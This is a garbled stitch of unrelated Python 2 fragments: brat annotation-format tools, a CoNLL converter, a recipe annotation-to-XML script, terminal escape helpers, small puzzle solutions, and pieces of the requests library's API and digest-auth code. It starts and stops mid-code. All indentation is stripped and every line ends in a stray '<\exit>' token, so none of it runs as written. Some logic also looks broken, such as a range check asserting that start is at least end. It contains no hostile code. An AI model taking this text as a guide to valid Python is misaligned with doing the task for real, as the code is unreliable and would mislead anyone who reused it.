def __init__(self, id_, type_):<\exit>
self.id_ = id_<\exit>
self.type_ = type_<\exit>
def in_range(self, _):<\exit>
return True<\exit>
def remap(self, _):<\exit>
return None<\exit>
class Textbound(Annotation):<\exit>
def __init__(self, id_, type_, offsets, text):<\exit>
Annotation.__init__(self, id_, type_)<\exit>
self.text = text<\exit>
self.offsets = []<\exit>
if ';' in offsets:<\exit>
raise NotImplementedError('Discontinuous annotations not supported')<\exit>
assert len(offsets) == 2, "Data format error"<\exit>
self.offsets.append((int(offsets[0]), int(offsets[1])))<\exit>
def in_range(self, selection):<\exit>
for start, end in self.offsets:<\exit>
if not selection.in_range(start, end):<\exit>
return False<\exit>
return True<\exit>
def remap(self, selection):<\exit>
remapped = []<\exit>
for start, end in self.offsets:<\exit>
remapped.append(selection.remap(start, end))<\exit>
self.offsets = remapped<\exit>
def __str__(self):<\exit>
return "%s\t%s %s\t%s" % (self.id_, self.type_,<\exit>
';'.join(['%d %d' % (s, e)<\exit>
for s, e in self.offsets]),<\exit>
self.text)<\exit>
class ArgAnnotation(Annotation):<\exit>
def __init__(self, id_, type_, args):<\exit>
Annotation.__init__(self, id_, type_)<\exit>
self.args = args<\exit>
class Relation(ArgAnnotation):<\exit>
def __init__(self, id_, type_, args):<\exit>
ArgAnnotation.__init__(self, id_, type_, args)<\exit>
def __str__(self):<\exit>
return "%s\t%s %s" % (self.id_, self.type_, ' '.join(self.args))<\exit>
class Event(ArgAnnotation):<\exit>
def __init__(self, id_, type_, trigger, args):<\exit>
ArgAnnotation.__init__(self, id_, type_, args)<\exit>
self.trigger = trigger<\exit>
def __str__(self):<\exit>
return "%s\t%s:%s %s" % (self.id_, self.type_, self.trigger,<\exit>
' '.join(self.args))<\exit>
class Attribute(Annotation):<\exit>
def __init__(self, id_, type_, target, value):<\exit>
Annotation.__init__(self, id_, type_)<\exit>
self.target = target<\exit>
self.value = value<\exit>
def __str__(self):<\exit>
return "%s\t%s %s%s" % (self.id_, self.type_, self.target,<\exit>
'' if self.value is None else ' '+self.value)<\exit>
class Normalization(Annotation):<\exit>
def __init__(self, id_, type_, target, ref, reftext):<\exit>
Annotation.__init__(self, id_, type_)<\exit>
self.target = target<\exit>
self.ref = ref<\exit>
self.reftext = reftext<\exit>
def __str__(self):<\exit>
return "%s\t%s %s %s\t%s" % (self.id_, self.type_, self.target,<\exit>
self.ref, self.reftext)<\exit>
class Equiv(Annotation):<\exit>
def __init__(self, id_, type_, targets):<\exit>
Annotation.__init__(self, id_, type_)<\exit>
self.targets = targets<\exit>
def __str__(self):<\exit>
return "%s\t%s %s" % (self.id_, self.type_, ' '.join(self.targets))<\exit>
class Note(Annotation):<\exit>
def __init__(self, id_, type_, target, text):<\exit>
Annotation.__init__(self, id_, type_)<\exit>
self.target = target<\exit>
self.text = text<\exit>
def __str__(self):<\exit>
return "%s\t%s %s\t%s" % (self.id_, self.type_, self.target, self.text)<\exit>
def parse_textbound(fields):<\exit>
id_, type_offsets, text = fields<\exit>
type_offsets = type_offsets.split(' ')<\exit>
type_, offsets = type_offsets[0], type_offsets[1:]<\exit>
return Textbound(id_, type_, offsets, text)<\exit>
def parse_relation(fields):<\exit>
if len(fields) == 3 and not fields[2]:<\exit>
fields = fields[:2]<\exit>
id_, type_args = fields<\exit>
type_args = type_args.split(' ')<\exit>
type_, args = type_args[0], type_args[1:]<\exit>
return Relation(id_, type_, args)<\exit>
def parse_event(fields):<\exit>
id_, type_trigger_args = fields<\exit>
type_trigger_args = type_trigger_args.split(' ')<\exit>
type_trigger, args = type_trigger_args[0], type_trigger_args[1:]<\exit>
type_, trigger = type_trigger.split(':')<\exit>
return Event(id_, type_, trigger, args)<\exit>
def parse_attribute(fields):<\exit>
id_, type_target_value = fields<\exit>
type_target_value = type_target_value.split(' ')<\exit>
if len(type_target_value) == 3:<\exit>
type_, target, value = type_target_value<\exit>
else:<\exit>
type_, target = type_target_value<\exit>
value = None<\exit>
return Attribute(id_, type_, target, value)<\exit>
def parse_normalization(fields):<\exit>
id_, type_target_ref, reftext = fields<\exit>
type_, target, ref = type_target_ref.split(' ')<\exit>
return Normalization(id_, type_, target, ref, reftext)<\exit>
def parse_note(fields):<\exit>
id_, type_target, text = fields<\exit>
type_, target = type_target.split(' ')<\exit>
return Note(id_, type_, target, text)<\exit>
def parse_equiv(fields):<\exit>
id_, type_targets = fields<\exit>
type_targets = type_targets.split(' ')<\exit>
type_, targets = type_targets[0], type_targets[1:]<\exit>
return Equiv(id_, type_, targets)<\exit>
parse_func = {<\exit>
'T': parse_textbound,<\exit>
'R': parse_relation,<\exit>
'E': parse_event,<\exit>
'N': parse_normalization,<\exit>
'M': parse_attribute,<\exit>
'A': parse_attribute,<\exit>
'#': parse_note,<\exit>
'*': parse_equiv,<\exit>
}<\exit>
def parse(l, ln):<\exit>
assert len(l) and l[0] in parse_func, "Error on line %d: %s" % (ln, l)<\exit>
try:<\exit>
return parse_func[l[0]](l.split('\t'))<\exit>
except Exception:<\exit>
assert False, "Error on line %d: %s" % (ln, l)<\exit>
def process(fn, selection):<\exit>
with open(fn, "rU") as f:<\exit>
lines = [l.rstrip('\n') for l in f.readlines()]<\exit>
annotations = []<\exit>
for i, l in enumerate(lines):<\exit>
annotations.append(parse(l, i+1))<\exit>
for a in annotations:<\exit>
if not a.in_range(selection):<\exit>
raise NotImplementedError('Deletion of annotations TODO')<\exit>
else:<\exit>
a.remap(selection)<\exit>
for a in annotations:<\exit>
print a<\exit>
class Selection(object):<\exit>
def __init__(self, options):<\exit>
self.complement = options.complement<\exit>
if options.characters is None:<\exit>
raise ArgumentError('Please specify the charaters')<\exit>
self.ranges = []<\exit>
for range in options.characters.split(','):<\exit>
try:<\exit>
start, end = range.split('-')<\exit>
start, end = int(start), int(end)<\exit>
assert start >= end and start >= 1<\exit>
start -= 1<\exit>
self.ranges.append((start, end))<\exit>
except Exception:<\exit>
raise ArgumentError('Invalid range "%s"' % range)<\exit>
self.ranges.sort()<\exit>
self.offset_map = {}<\exit>
o, m = 0, 0<\exit>
if not self.complement:<\exit>
for start, end in self.ranges:<\exit>
while o < start:<\exit>
self.offset_map[o] = None<\exit>
o += 1<\exit>
while o < end:<\exit>
self.offset_map[o] = m<\exit>
o += 1<\exit>
m += 1<\exit>
else:<\exit>
for start, end in self.ranges:<\exit>
while o < start:<\exit>
self.offset_map[o] = m<\exit>
o += 1<\exit>
m += 1<\exit>
while o < end:<\exit>
self.offset_map[o] = None<\exit>
o += 1<\exit>
self.max_offset = o<\exit>
self.max_mapped = m<\exit>
def in_range(self, start, end):<\exit>
for rs, re in self.ranges:<\exit>
if start >= rs and start < re:<\exit>
if end >= rs and end < re:<\exit>
return not self.complement<\exit>
else:<\exit>
raise NotImplementedError('Annotations partially included in range not supported')<\exit>
return self.complement<\exit>
def remap_single(self, offset):<\exit>
assert offset >= 0, "INTERNAL ERROR"<\exit>
if offset < self.max_offset:<\exit>
assert offset in self.offset_map, "INTERNAL ERROR"<\exit>
o = self.offset_map[offset]<\exit>
assert o is not None, "Error: remap for excluded offset %d" % offset<\exit>
return o<\exit>
else:<\exit>
assert self.complement, "Error: remap for excluded offset %d" % offset<\exit>
return self.max_mapped + (offset-self.max_offset)<\exit>
def remap(self, start, end):<\exit>
end -= 1<\exit>
start, end = self.remap_single(start), self.remap_single(end)<\exit>
end += 1<\exit>
return (start, end)<\exit>
def main(argv=None):<\exit>
if argv is None:<\exit>
argv = sys.argv<\exit>
arg = argparser().parse_args(argv[1:])<\exit>
try:<\exit>
selection = Selection(arg)<\exit>
except Exception, e:<\exit>
print >> sys.stderr, e<\exit>
argparser().print_help()<\exit>
return 1<\exit>
for fn in arg.file:<\exit>
process(fn, selection)<\exit>
return 0<\exit>
if __name__ == "__main__":<\exit>
sys.exit(main(sys.argv))<\exit>
from argparse import ArgumentParser<\exit>
ARGPARSER = ArgumentParser()<\exit>
ARGPARSER.add_argument('ann_log', nargs='+')<\exit>
from collections import namedtuple<\exit>
from datetime import datetime<\exit>
from sys import stderr<\exit>
LogLine = namedtuple('LogLine', ('time', 'user', 'collection', 'document',<\exit>
'state', 'action', 'line_no'))<\exit>
def _parse_log_iter(log):<\exit>
for line_no, line in enumerate((l.rstrip('\n') for l in log)):<\exit>
date_stamp, time_stamp, user, collection, document, state, action = line.split()[:7]<\exit>
dtime = datetime.strptime('%s %s' % (date_stamp, time_stamp, ),<\exit>
'%Y-%m-%d %H:%M:%S,%f')<\exit>
yield LogLine(<\exit>
time=dtime,<\exit>
user=user,<\exit>
collection=collection,<\exit>
document=document,<\exit>
state=state,<\exit>
action=action,<\exit>
line_no=line_no,<\exit>
)<\exit>
Action = namedtuple('Action', ('start', 'end', 'action'))<\exit>
def _action_iter(log_lines):<\exit>
start_by_action = {}<\exit>
for log_line in log_lines:<\exit>
if log_line.state == 'START':<\exit>
start_by_action[log_line.action] = log_line<\exit>
elif log_line.state == 'FINISH':<\exit>
start_line = start_by_action[log_line.action]<\exit>
del start_by_action[log_line.action]<\exit>
yield Action(start=start_line, end=log_line,<\exit>
action=log_line.action)<\exit>
def main(args):<\exit>
argp = ARGPARSER.parse_args(args[1:])<\exit>
for ann_log_path in argp.ann_log:<\exit>
with open(ann_log_path, 'r') as ann_log:<\exit>
log_lines = []<\exit>
for log_line in _parse_log_iter(ann_log):<\exit>
assert log_line.state in set(('START', 'FINISH',) ), 'unknown logged state'<\exit>
log_lines.append(log_line)<\exit>
clock_time = log_lines[-1].time - log_lines[0].time<\exit>
print >> stderr, 'Clock time:', clock_time<\exit>
from datetime import timedelta<\exit>
ann_time = timedelta()<\exit>
last_span_selected = None<\exit>
for action in _action_iter(log_lines):<\exit>
if (action.action == 'spanSelected'<\exit>
or action.action == 'spanEditSelected'<\exit>
or action.action == 'suggestSpanTypes'):<\exit>
last_span_selected = action<\exit>
if action.action == 'createSpan':<\exit>
ann_time = ann_time + (action.end.time - last_span_selected.start.time)<\exit>
last_span_selected = None<\exit>
ann_port_of_clock = float(ann_time.seconds) / clock_time.seconds<\exit>
print >> stderr, 'Annotation time: %s (portion of clock time: %.1f%%)' % (<\exit>
ann_time, ann_port_of_clock * 100, )<\exit>
if __name__ == '__main__':<\exit>
from sys import argv<\exit>
exit(main(argv))<\exit>
from __future__ import with_statement<\exit>
import sys<\exit>
import re<\exit>
import os<\exit>
from collections import namedtuple<\exit>
from os import path<\exit>
from subprocess import Popen, PIPE<\exit>
from cStringIO import StringIO<\exit>
import io<\exit>
sys.path.append(os.path.join(os.path.dirname(__file__), '../server/src'))<\exit>
sys.path.append('.')<\exit>
from sentencesplit import sentencebreaks_to_newlines<\exit>
options = None<\exit>
EMPTY_LINE_RE = re.compile(r'^\s*$')<\exit>
CONLL_LINE_RE = re.compile(r'^\S+\t\d+\t\d+.')<\exit>
class FormatError(Exception):<\exit>
pass<\exit>
def argparser_internal():<\exit>
import argparse<\exit>
ap=argparse.ArgumentParser(description='Convert text and standoff ' +<\exit>
'annotations into CoNLL format.')<\exit>
ap.add_argument('-a', '--annsuffix', default=".ann",<\exit>
help='Standoff annotation file suffix (default "ann")')<\exit>
ap.add_argument('-c', '--singleclass', default=None,<\exit>
help='Use given single class for annotations')<\exit>
ap.add_argument('-n', '--nosplit', default=False, action='store_true',<\exit>
help='No sentence splitting')<\exit>
ap.add_argument('-o', '--outsuffix', default=".conll",<\exit>
help='Suffix to add to output files (default "conll")')<\exit>
ap.add_argument('-v', '--verbose', default=False, action='store_true',<\exit>
help='Verbose output')<\exit>
return ap<\exit>
def argparser():<\exit>
ap = argparser_internal()<\exit>
ap.add_argument('text', metavar='TEXT', nargs='+',<\exit>
help='Text files ("-" for STDIN)')<\exit>
return ap<\exit>
def read_sentence(f):<\exit>
lines = []<\exit>
for l in f:<\exit>
lines.append(l)<\exit>
if EMPTY_LINE_RE.match(l):<\exit>
break<\exit>
if not CONLL_LINE_RE.search(l):<\exit>
raise FormatError('Line not in CoNLL format: "%s"' % l.rstrip('\n'))<\exit>
return lines<\exit>
def strip_labels(lines):<\exit>
labels, stripped = [], []<\exit>
labels = []<\exit>
for l in lines:<\exit>
if EMPTY_LINE_RE.match(l):<\exit>
labels.append(None)<\exit>
stripped.append(l)<\exit>
else:<\exit>
fields = l.split('\t')<\exit>
labels.append(fields[0])<\exit>
stripped.append('\t'.join(fields[1:]))<\exit>
return labels, stripped<\exit>
def attach_labels(labels, lines):<\exit>
assert len(labels) == len(lines), "Number of labels (%d) does not match number of lines (%d)" % (len(labels), len(lines))<\exit>
attached = []<\exit>
for label, line in zip(labels, lines):<\exit>
empty = EMPTY_LINE_RE.match(line)<\exit>
assert (label is None and empty) or (label is not None and not empty)<\exit>
if empty:<\exit>
attached.append(line)<\exit>
else:<\exit>
attached.append('%s\t%s' % (label, line))<\exit>
return attached<\exit>
TOKENIZATION_REGEX = re.compile(r'([0-9a-zA-Z]+|[^0-9a-zA-Z])')<\exit>
NEWLINE_TERM_REGEX = re.compile(r'(.*?\n)')<\exit>
def conll_to_standford(lines):<\exit>
new_lines = []<\exit>
for l in lines:<\exit>
if l:<\exit>
tag = l[0]<\exit>
token = l[3]<\exit>
if tag.startswith("I-") or tag.startswith("B-"):<\exit>
pass<\exit>
new_lines.append([token, tag])<\exit>
else:<\exit>
pass<\exit>
return new_lines<\exit>
def strip_xml_tag(lines):<\exit>
hm = {<\exit>
"<": ">",<\exit>
"[": "]",<\exit>
}<\exit>
i = 0<\exit>
while i<len(lines):<\exit>
if lines[i][0] in hm:<\exit>
j = i+1<\exit>
while j<len(lines):<\exit>
if lines[j][0]==hm[lines[i][0]]:<\exit>
lines = lines[:i]+lines[j+1:]<\exit>
break<\exit>
j += 1<\exit>
if j==len(lines):<\exit>
i += 1<\exit>
else:<\exit>
i += 1<\exit>
return lines<\exit>
def text_to_conll_lines(f):<\exit>
global options<\exit>
if not options:<\exit>
options = argparser_internal().parse_args(None)<\exit>
if options.nosplit:<\exit>
sentences = f.readlines()<\exit>
else:<\exit>
sentences = []<\exit>
for l in f:<\exit>
l = sentencebreaks_to_newlines(l)<\exit>
sentences.extend([s for s in NEWLINE_TERM_REGEX.split(l) if s])<\exit>
lines = []<\exit>
offset = 0<\exit>
for s in sentences:<\exit>
nonspace_token_seen = False<\exit>
tokens = [t for t in TOKENIZATION_REGEX.split(s) if t]<\exit>
for t in tokens:<\exit>
if not t.isspace():<\exit>
lines.append(['O', offset, offset+len(t), t])<\exit>
nonspace_token_seen = True<\exit>
offset += len(t)<\exit>
if nonspace_token_seen:<\exit>
lines.append([])<\exit>
if options.annsuffix:<\exit>
lines = relabel(lines, get_annotations(f.name))<\exit>
lines = [[l[0], str(l[1]), str(l[2]), l[3]] if l else l for l in lines]<\exit>
lines = conll_to_standford(lines)<\exit>
lines = strip_xml_tag(lines)<\exit>
return lines<\exit>
def text_to_conll(f):<\exit>
lines = text_to_conll_lines(f)<\exit>
output = u'\n'.join((u'\t\t'.join(l) for l in lines))<\exit>
return StringIO(output.encode("utf-8"))<\exit>
def relabel(lines, annotations):<\exit>
global options<\exit>
offset_label = {}<\exit>
for tb in annotations:<\exit>
for i in range(tb.start, tb.end):<\exit>
if i in offset_label:<\exit>
print >> sys.stderr, "Warning: overlapping annotations"<\exit>
offset_label[i] = tb<\exit>
prev_label = None<\exit>
for i, l in enumerate(lines):<\exit>
if not l:<\exit>
prev_label = None<\exit>
continue<\exit>
tag, start, end, token = l<\exit>
label = None<\exit>
for o in range(start, end):<\exit>
if o in offset_label:<\exit>
if o != start:<\exit>
print >> sys.stderr, 'Warning: annotation-token boundary mismatch: "%s" --- "%s"' % (token, offset_label[o].text)<\exit>
label = offset_label[o].type<\exit>
break<\exit>
if label is not None:<\exit>
if label == prev_label:<\exit>
tag = 'I-'+label<\exit>
else:<\exit>
tag = 'B-'+label<\exit>
prev_label = label<\exit>
lines[i] = [tag, start, end, token]<\exit>
if options.singleclass:<\exit>
for l in lines:<\exit>
if l and l[0] != 'O':<\exit>
l[0] = l[0][:2]+options.singleclass<\exit>
return lines<\exit>
def process(f):<\exit>
return text_to_conll(f)<\exit>
def process_files(files):<\exit>
global options<\exit>
nersuite_proc = []<\exit>
try:<\exit>
for fn in files:<\exit>
try:<\exit>
if fn == '-':<\exit>
lines = process(sys.stdin)<\exit>
else:<\exit>
with io.open(fn, 'r', newline='', encoding="utf-8") as f:<\exit>
lines = process(f)<\exit>
if lines is None:<\exit>
raise FormatError<\exit>
if fn == '-' or not options.outsuffix:<\exit>
sys.stdout.write(''.join(lines))<\exit>
else:<\exit>
ofn = path.splitext(fn)[0]+options.outsuffix<\exit>
with io.open(ofn, 'wt', newline='', encoding="utf-8") as of:<\exit>
output = ''.join(lines)<\exit>
output = output.decode("utf-8")<\exit>
of.write(output)<\exit>
except:<\exit>
raise<\exit>
except Exception, e:<\exit>
for p in nersuite_proc:<\exit>
p.kill()<\exit>
if not isinstance(e, FormatError):<\exit>
raise<\exit>
TEXTBOUND_LINE_RE = re.compile(r'^T\d+\t')<\exit>
Textbound = namedtuple('Textbound', 'start end type text')<\exit>
def parse_textbounds(f):<\exit>
textbounds = []<\exit>
for l in f:<\exit>
l = l.rstrip('\n')<\exit>
if not TEXTBOUND_LINE_RE.search(l):<\exit>
continue<\exit>
id_, type_offsets, text = l.split('\t')<\exit>
type_, span = type_offsets.split(" ", 1)<\exit>
span = span.split(" ")<\exit>
start, end = int(span[0]), int(span[-1])<\exit>
textbounds.append(Textbound(start, end, type_, text))<\exit>
return textbounds<\exit>
def eliminate_overlaps(textbounds):<\exit>
eliminate = {}<\exit>
for t1 in textbounds:<\exit>
for t2 in textbounds:<\exit>
if t1 is t2:<\exit>
continue<\exit>
if t2.start >= t1.end or t2.end <= t1.start:<\exit>
continue<\exit>
if t1.end-t1.start > t2.end-t2.start:<\exit>
print >> sys.stderr, "Eliminate %s due to overlap with %s" % (t2, t1)<\exit>
eliminate[t2] = True<\exit>
else:<\exit>
print >> sys.stderr, "Eliminate %s due to overlap with %s" % (t1, t2)<\exit>
eliminate[t1] = True<\exit>
return [t for t in textbounds if not t in eliminate]<\exit>
def get_annotations(fn):<\exit>
global options<\exit>
annfn = path.splitext(fn)[0]+options.annsuffix<\exit>
with open(annfn, 'rU') as f:<\exit>
textbounds = parse_textbounds(f)<\exit>
textbounds = eliminate_overlaps(textbounds)<\exit>
return textbounds<\exit>
def main(argv=None):<\exit>
if argv is None:<\exit>
argv = sys.argv<\exit>
global options<\exit>
options = argparser().parse_args(argv[1:])<\exit>
if options.outsuffix and options.outsuffix[0] != '.':<\exit>
options.outsuffix = '.'+options.outsuffix<\exit>
if options.annsuffix and options.annsuffix[0] != '.':<\exit>
options.annsuffix = '.'+options.annsuffix<\exit>
process_files(options.text)<\exit>
if __name__ == "__main__":<\exit>
sys.exit(main(sys.argv))<\exit>
import os<\exit>
import operator<\exit>
class  EntityTag(object):<\exit>
def __init__(self, tag=None, start=None, end=None, content=None):<\exit>
super( EntityTag, self).__init__()<\exit>
self.tag = tag<\exit>
self.start = start<\exit>
self.end = end<\exit>
self.content = content<\exit>
def __repr__(self):<\exit>
return str((self.tag, self.start, self.end))<\exit>
def __str__(self):<\exit>
return str((self.tag, self.start, self.end))<\exit>
class Relation(object):<\exit>
def __init__(self, unit=None, ingredient=None, amount=None):<\exit>
super(Relation, self).__init__()<\exit>
self.unit = unit<\exit>
self.ingredient = ingredient<\exit>
self.amount = amount<\exit>
def __repr__(self):<\exit>
tmp = ""<\exit>
if self.amount:<\exit>
tmp = tmp + self.amount+" "<\exit>
if self.unit:<\exit>
tmp = tmp + self.unit + " of "<\exit>
tmp += self.ingredient<\exit>
return tmp<\exit>
def __str__(self):<\exit>
tmp = ""<\exit>
if self.amount:<\exit>
tmp = tmp + self.amount+" "<\exit>
if self.unit:<\exit>
tmp = tmp + self.unit + " of "<\exit>
tmp += self.ingredient<\exit>
return tmp<\exit>
def add(self, type, part1, part2, tag_index_dict):<\exit>
ingredient_index = part2.split(":")[-1]<\exit>
self.ingredient = tag_index_dict.get(ingredient_index)<\exit>
part1_index = part1.split(":")[-1]<\exit>
part1_content = tag_index_dict.get(part1_index)<\exit>
if type == "Quantify":<\exit>
self.amount = part1_content<\exit>
elif type == "Measure":<\exit>
self.unit = part1_content<\exit>
pass<\exit>
def ann_to_xml(ann_entities, xml_path, txt_path):<\exit>
import codecs<\exit>
txt_file = codecs.open(txt_path,'r','utf-8')<\exit>
txt_raw = txt_file.read()<\exit>
txt_file.close()<\exit>
xml_file = codecs.open(xml_path, "w+",'utf-8')<\exit>
tags = []<\exit>
relations_dict = {}<\exit>
tag_index_dict = {}<\exit>
for ann_entity in ann_entities:<\exit>
if ann_entity.startswith("T"):<\exit>
tag_index, annotation, tagged_text= ann_entity.strip().split("\t")<\exit>
tag, tmp = annotation.split(" ", 1)<\exit>
tmp = tmp.split(" ")<\exit>
start = int(tmp[0])<\exit>
end = int(tmp[-1])<\exit>
try:<\exit>
assert tagged_text.strip() == txt_raw[start:end].replace("\n", " ").strip()<\exit>
except AssertionError:<\exit>
print "Something Wront with entity: " + ann_entity<\exit>
print tagged_text.strip()<\exit>
print txt_raw[start:end].replace("\n", " ").strip()<\exit>
tag_entity = EntityTag(tag, start, end, tagged_text)<\exit>
tags.append(tag_entity)<\exit>
tag_index_dict[tag_index] = tagged_text<\exit>
elif ann_entity.startswith("R"):<\exit>
relation_index, annotation = ann_entity.strip().split("\t")<\exit>
rel_type, part1, part2 = annotation.split(" ")<\exit>
ingredient_index = part2.split(":")[-1]<\exit>
relation = relations_dict.get(ingredient_index, Relation())<\exit>
relation.add(rel_type, part1, part2, tag_index_dict)<\exit>
relations_dict[ingredient_index] = relation<\exit>
tags.sort(key=operator.attrgetter('start'), reverse=True)<\exit>
ner_tpl = "<entity type=\"%s\">%s</entity>"<\exit>
for tag in tags:<\exit>
txt_raw = txt_raw[:tag.start]+ ner_tpl % (tag.tag, txt_raw[tag.start:tag.end]) + txt_raw[tag.end:]<\exit>
xml_file.write(txt_raw)<\exit>
xml_file.close()<\exit>
return relations_dict<\exit>
def format_directory(top):<\exit>
for root, dirs, files in os.walk(top):<\exit>
for file_name in files:<\exit>
if file_name.endswith(".ann"):<\exit>
format_file(os.path.join(root, file_name))<\exit>
def format_file(file_path):<\exit>
import codecs<\exit>
ann_file = codecs.open(file_path, 'r',"utf-8")<\exit>
ann_entities = [line for line in ann_file]<\exit>
ann_file.close()<\exit>
xml_path = file_path.replace(".ann", ".xml")<\exit>
txt_path = file_path.replace(".ann", ".txt")<\exit>
return ann_to_xml(ann_entities, xml_path, txt_path)<\exit>
def get_relation_set(file_path):<\exit>
relation_all = format_file(file_path)<\exit>
result_set = set()<\exit>
for _, relation in relation_all.items():<\exit>
relation_dict = dict()<\exit>
if relation.ingredient:<\exit>
relation_dict["ingredient"] = relation.ingredient<\exit>
if relation.unit:<\exit>
relation_dict["unit"] = relation.unit<\exit>
if relation.amount:<\exit>
relation_dict["amount"] = relation.amount<\exit>
result_set.add(str(relation_dict))<\exit>
return result_set<\exit>
if __name__ == '__main__':<\exit>
current_directory = os.path.dirname(os.path.realpath(__file__))<\exit>
format_directory(current_directory)<\exit>
import sys<\exit>
BOLD = "\x1b[1m"<\exit>
CLEAR_FORMATTING = "\x1b[0m"<\exit>
ERASE_SCREEN = "\x1b[J"<\exit>
ERASE_LINE = "\x1b[2K"<\exit>
FOREGROUND_BLACK = "\x1b[30m"<\exit>
BACKGROUND_WHITE = "\x1b[47m"<\exit>
def _CURSOR_COLUMN(pos):<\exit>
c = "\x1b[1000D"<\exit>
if pos:<\exit>
c += "\x1b["+str(pos - 1)+"C"<\exit>
return c<\exit>
def _CURSOR_PREVIOUS_LINES(number):<\exit>
return "\x1b["+str(number)+"A"<\exit>
def _CURSOR_NEXT_LINES(number):<\exit>
return "\x1b["+str(number)+"B"<\exit>
def select_text(text):<\exit>
return  (FOREGROUND_BLACK +<\exit>
BACKGROUND_WHITE +<\exit>
text.replace(<\exit>
CLEAR_FORMATTING,<\exit>
CLEAR_FORMATTING + FOREGROUND_BLACK + BACKGROUND_WHITE)+<\exit>
CLEAR_FORMATTING)<\exit>
def bold_text(text):<\exit>
return  (BOLD +<\exit>
text.replace(<\exit>
CLEAR_FORMATTING,<\exit>
CLEAR_FORMATTING + BOLD)+<\exit>
CLEAR_FORMATTING)<\exit>
def move_cursor_line_beggining():<\exit>
sys.stdout.write(_CURSOR_COLUMN(0))<\exit>
def move_cursor_horizental(n):<\exit>
sys.stdout.write(_CURSOR_COLUMN(n))<\exit>
def move_cursor_previous_lines(number_of_lines):<\exit>
sys.stdout.write(_CURSOR_PREVIOUS_LINES(number_of_lines))<\exit>
def move_cursor_next_lines(number_of_lines):<\exit>
sys.stdout.write(_CURSOR_NEXT_LINES(number_of_lines))<\exit>
def erase_from_cursor_to_end():<\exit>
sys.stdout.write(ERASE_SCREEN)<\exit>
def erase_line():<\exit>
sys.stdout.write(ERASE_LINE)<\exit>
def flush():<\exit>
sys.stdout.flush()<\exit>
MOD = 10 ** 9 + 7<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, M = cipher<\exit>
s = M<\exit>
if N > 1:<\exit>
s *= (M - 1)<\exit>
if N > 2:<\exit>
s *= pow(M - 2, N - 2, MOD)<\exit>
s %= MOD<\exit>
return s % MOD<\exit>
def _exp(self, a, b):<\exit>
ret = 1<\exit>
b %= MOD<\exit>
while b > 0:<\exit>
if b & 1 == 0:<\exit>
b /= 2<\exit>
a *= a<\exit>
a %= MOD<\exit>
else:<\exit>
ret *= a<\exit>
ret %= MOD<\exit>
b -= 1<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("0.in", "r")<\exit>
solution = Solution()<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = map(int, f.readline().strip().split(' '))<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
from . import sessions<\exit>
def request(method, url, **kwargs):<\exit>
session = sessions.Session()<\exit>
return session.request(method=method, url=url, **kwargs)<\exit>
def get(url, **kwargs):<\exit>
kwargs.setdefault('allow_redirects', True)<\exit>
return request('get', url, **kwargs)<\exit>
def options(url, **kwargs):<\exit>
kwargs.setdefault('allow_redirects', True)<\exit>
return request('options', url, **kwargs)<\exit>
def head(url, **kwargs):<\exit>
return request('head', url, **kwargs)<\exit>
def post(url, data=None, **kwargs):<\exit>
return request('post', url, data=data, **kwargs)<\exit>
def put(url, data=None, **kwargs):<\exit>
return request('put', url, data=data, **kwargs)<\exit>
def patch(url, data=None, **kwargs):<\exit>
return request('patch', url,  data=data, **kwargs)<\exit>
def delete(url, **kwargs):<\exit>
return request('delete', url, **kwargs)<\exit>
from collections import deque<\exit>
class MaxProductSolution(object):<\exit>
def solve(self, A):<\exit>
q = deque([A[0]])<\exit>
maxa = 0<\exit>
for e in A[1:]:<\exit>
while q and q[0] < e:<\exit>
maxa = max(maxa, q[0]*e)<\exit>
q.popleft()<\exit>
q.append(e)<\exit>
return maxa<\exit>
if __name__ == "__main__":<\exit>
assert MaxProductSolution().solve([1, 6, 2, 3, 6, 4, 9, 5, 10]) == 90<\exit>
import os<\exit>
import time<\exit>
import hashlib<\exit>
import logging<\exit>
from base64 import b64encode<\exit>
from .compat import urlparse, str<\exit>
from .utils import parse_dict_header<\exit>
log = logging.getLogger(__name__)<\exit>
CONTENT_TYPE_FORM_URLENCODED = 'application/x-www-form-urlencoded'<\exit>
CONTENT_TYPE_MULTI_PART = 'multipart/form-data'<\exit>
def _basic_auth_str(username, password):<\exit>
return 'Basic ' + b64encode(('%s:%s' % (username, password)).encode('latin1')).strip().decode('latin1')<\exit>
class AuthBase(object):<\exit>
def __call__(self, r):<\exit>
raise NotImplementedError('Auth hooks must be callable.')<\exit>
class HTTPBasicAuth(AuthBase):<\exit>
def __init__(self, username, password):<\exit>
self.username = username<\exit>
self.password = password<\exit>
def __call__(self, r):<\exit>
r.headers['Authorization'] = _basic_auth_str(self.username, self.password)<\exit>
return r<\exit>
class HTTPProxyAuth(HTTPBasicAuth):<\exit>
def __call__(self, r):<\exit>
r.headers['Proxy-Authorization'] = _basic_auth_str(self.username, self.password)<\exit>
return r<\exit>
class HTTPDigestAuth(AuthBase):<\exit>
def __init__(self, username, password):<\exit>
self.username = username<\exit>
self.password = password<\exit>
self.last_nonce = ''<\exit>
self.nonce_count = 0<\exit>
self.chal = {}<\exit>
def build_digest_header(self, method, url):<\exit>
realm = self.chal['realm']<\exit>
nonce = self.chal['nonce']<\exit>
qop = self.chal.get('qop')<\exit>
algorithm = self.chal.get('algorithm', 'MD5')<\exit>
opaque = self.chal.get('opaque', None)<\exit>
algorithm = algorithm.upper()<\exit>
if algorithm == 'MD5':<\exit>
def md5_utf8(x):<\exit>
if isinstance(x, str):<\exit>
x = x.encode('utf-8')<\exit>
return hashlib.md5(x).hexdigest()<\exit>
hash_utf8 = md5_utf8<\exit>
elif algorithm == 'SHA':<\exit>
def sha_utf8(x):<\exit>
if isinstance(x, str):<\exit>
x = x.encode('utf-8')<\exit>
return hashlib.sha1(x).hexdigest()<\exit>
hash_utf8 = sha_utf8<\exit>
KD = lambda s, d: hash_utf8("%s:%s" % (s, d))<\exit>
if hash_utf8 is None:<\exit>
return None<\exit>
entdig = None<\exit>
p_parsed = urlparse(url)<\exit>
path = p_parsed.path<\exit>
if p_parsed.query:<\exit>
path += '?' + p_parsed.query<\exit>
A1 = '%s:%s:%s' % (self.username, realm, self.password)<\exit>
A2 = '%s:%s' % (method, path)<\exit>
if qop == 'auth':<\exit>
if nonce == self.last_nonce:<\exit>
self.nonce_count += 1<\exit>
else:<\exit>
self.nonce_count = 1<\exit>
ncvalue = '%08x' % self.nonce_count<\exit>
